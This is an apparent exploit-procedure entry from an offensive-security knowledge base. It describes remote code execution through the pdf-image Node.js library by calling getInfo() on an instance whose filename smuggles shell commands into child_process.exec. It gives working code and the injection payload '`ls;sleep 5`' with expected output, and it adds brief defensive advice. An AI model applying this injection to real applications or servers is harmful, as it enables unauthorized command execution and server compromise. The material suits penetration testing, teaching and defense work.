---
tags:
  - rce
  - execution
  - node.js
type: procedure
tools:
  - '[[tools/pdf-image-exploit-script]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/sleep-demonstrate-injection]]'
  - '[[commands/ls-and-sleep-injection]]'
verified: false
platforms:
  - Node.js
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:23:32.575Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: cb00db4c-4edd-4a8e-9c2c-af8af8518c5b
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
  - '[[Exploit Public-Facing Application]]'
---
# Trigger-RCE-via-getInfo-Method

## Summary

This procedure invokes the getInfo() method on a tainted PDFImage instance, triggering child_process.exec with the injected shell command to achieve remote code execution.

## Description

The getInfo() method in pdf-image executes an ImageMagick 'identify' command via child_process.exec, incorporating the unsanitized filename. When using a malicious payload, this results in arbitrary shell command execution, such as pausing the process or listing files. In a real attack, this could lead to full server compromise if the application processes user-supplied PDFs. Test in a controlled Node.js script.

## Requirements

1. Tainted PDFImage instance from previous step
2. Node.js async handling (Promises for getInfo)
3. Shell environment with ImageMagick

## Defense

Defensive measures and detection strategies:

- Avoid shell-based PDF processing; use pure JS libraries like pdf.js
- Implement input validation and escaping for all exec parameters
- Monitor process execution logs for anomalous commands (e.g., sleep, ls in PDF contexts)

## Objectives

1. Execute the injected command via getInfo()
2. Confirm RCE with observable effects (e.g., delay or output)
3. Demonstrate potential for more destructive payloads

## Instructions

### Step 1: Invoke getInfo with Basic Payload

**Context**: Call getInfo() to run the exec command, triggering the sleep injection.

**Command** ([[commands/sleep-demonstrate-injection]]):
```javascript
pdfImage.getInfo().then((info) => {
  console.log(info);
}).catch((err) => {
  console.error(err);
});
```

> This executes the tainted command. Expected output: Process hangs for 500 seconds, confirming injection; partial ImageMagick output if any.

### Step 2: Test with Alternative Payload

**Context**: Use backticks for injection in double-quoted contexts, combining ls and sleep.

**Command** ([[commands/ls-and-sleep-injection]]):
```javascript
const pdfImageAlt = new PDFImage('`ls;sleep 5`');
pdfImageAlt.getInfo();
```

> Expected output: Directory listing in console or logs, followed by 5-second pause.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]
- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/sleep-demonstrate-injection]]
- [[commands/ls-and-sleep-injection]]

## Tools Used

- [[tools/pdf-image-exploit-script]]

## Tags

- rce
- execution
